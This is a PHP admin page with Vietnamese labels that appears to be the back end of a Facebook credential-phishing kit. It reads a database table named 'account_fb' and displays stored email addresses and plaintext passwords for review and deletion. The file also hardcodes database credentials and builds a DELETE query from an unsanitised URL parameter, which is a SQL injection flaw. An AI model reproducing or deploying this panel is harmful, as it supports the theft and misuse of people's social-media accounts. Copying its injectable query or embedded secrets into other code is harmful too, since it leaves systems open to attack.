<?php
session_start();
if(empty($_SESSION["admin"])){
  header("Location: adlg.php");
  die;
}
$servername = "localhost";
$database = "garename_wp710";
$username = "garename_wp710";
$password = 'V,3#Gl$*O7hJ';
$conn = mysqli_connect($servername, $username, $password, $database);
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
mysqli_set_charset($conn,"utf-8");
if(isset($_GET["id"]))
{
  $conn->query("DELETE FROM `account_fb` WHERE `id` = '".$_GET["id"]."'");
  
}
$sqli = mysqli_query($conn,"SELECT * FROM `account_fb` ");
?>
<html>
  <head>
    <title>Admin Quản Lý Web</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
    <meta name="theme-color" content="#3b5998" />
    <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
    <style>
*{
	box-sizing: border-box;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	-o-box-sizing: border-box;
}
table{
    padding: 0;
    border: none;
    border-collapse: collapse;
    border: 1px solid #ddd;
    width: 1170px;
    margin: 50px auto 10px;
}
table td {
    padding: 0;
    border: none;
    border-collapse: collapse;
}
a {
    color: #666;
    text-decoration: none;
}
.table tr>td, 
.table tr>th {
    border: 1px solid #ddd;
    padding: 8px;
    line-height: 1.42857143;
    vertical-align: top;
    border-top: 1px solid #ddd;
    font-weight: normal;
}
.cart_avail {
    text-align: center;
}
img {
    vertical-align: top;
    max-width: 100%;
}
.cart_summary > thead, 
.cart_summary > tfoot {
    background: #f7f7f7;
    font-size: 16px;
}
.cart_summary td.cart_product {
    width: 120px;
    padding: 15px;
}
.page-order .cart_description {
    font-size: 10px
    width: 120px;
}
.page-order .product-name {
    font-size: 16px;
    width: 80px;
}
.cart_summary td {
    vertical-align: middle!important;
    padding: 20px;
}
a {
    color: #666;
    text-decoration: none;
	outline: none !important;
}
.cart_avail .label {
    white-space: normal;
    display: inline-block;
    padding: 6px 10px;
    font-size: 10px;
    border-radius: 0px;
}
.cart_summary .price {
    text-align: right;
}
.cart_summary .qty {
    text-align: center;
    width: 100px;
}
.cart_summary .qty a:hover {
    background: #ff3366;
    color: #fff;
}
.form-control {
    display: block;
    width: 100%;
    height: 34px;
    padding: 6px 12px;
    font-size: 14px;
    line-height: 1.42857143;
    color: #555;
    background-color: #fff;
    background-image: none;
    border: 1px solid #ccc;
    border-radius: 4px;
    -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
    box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
    -webkit-transition: border-color ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;
    -o-transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
    transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
}
.form-control:focus {
    border-color: #66afe9;
    outline: 0;
    -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102,175,233,.6);
    box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102,175,233,.6);
}
.input-sm {
    height: 30px;
    padding: 5px 10px;
    font-size: 12px;
    line-height: 1.5;
    border-radius: 3px;
}
.cart_summary .qty input {
    text-align: center;
    max-width: 64px;
    margin: 0 auto;
    border-radius: 0px;
    border: 1px solid #eaeaea;
}
.cart_avail .label-success {
    background: #FFF;
    border: 1px solid #55c65e;
    color: #48b151;
    font-weight: normal;
}
.cart_summary .qty a {
    padding: 8px 10px 5px 10px;
    border: 1px solid #eaeaea;
    display: inline-block;
    width: auto;
    margin-top: 5px;
}
.cart_summary .action {
    text-align: center;
}
.cart_summary .action a {
    background: url(https://i.imgur.com/wBgtljO.png) no-repeat center center;
    font-size: 0;
    height: 9px;
    width: 9px;
    display: inline-block;
    line-height: 24px;
}
.cart_summary tfoot {
    text-align: right;
}
.cart_navigation {
    margin: 10px 10% 40px;
    float: left;
    width: 80%;
}
.cart_navigation a.prev-btn {
    float: left;
}
.cart_navigation a {
    padding: 10px 20px;
    border: 1px solid #eaeaea;
}
.cart_navigation a.prev-btn:before {
    font: normal normal normal 14px/1 FontAwesome;
    content: "\f104";
    padding-right: 15px;
}
.cart_navigation a.next-btn {
    float: right;
    background: #ff3366;
    color: #fff;
    border: 1px solid #ff3366;
}
.cart_navigation a:hover {
    background: #ff3366;
    color: #fff;
}
h2{
  text-align: center;
}
    </style>
  </head>
  <body>
    <div id="adminn">
      <h2>Quản Lý Account</h2>
    </div>
<div class="wrapper">
	<table class="table table-bordered cart_summary">
        <thead>
            <tr>
                <th class="cart_product">Loại Account</th>
                <th>Ghi Chú</th>
                <th>Xoá</th>
            </tr>
        </thead>
        <tbody>
<?php while($rows = mysqli_fetch_assoc($sqli)){ ?>
            <tr>
                <td class="cart_product">
                    <a href="#"><img src="facebook-icon.png" alt="Product">
                    </a>
                </td>
                <td class="cart_description">
                    <p class="product-name"><a href="#">Thông Tin Tài Khoản </a>
                    </p>
                    <small class="cart_ref">EMAIL :<?= $rows["email"] ?></small>
                    <br>
                    <small>Pass: <?= $rows["password"] ?></small>
                    <br>
                    <small><br></small>
                </td>
                <td class="cart_avail"><a href="quanly.php?id=<?= $rows['id'] ?>"><span class="label label-success" onclick="clear(this)">Click Xoá</span></a>
                </td>
            </tr>
            <?php } ?>
        </tbody>
    </table>
</div>
</body>
</html>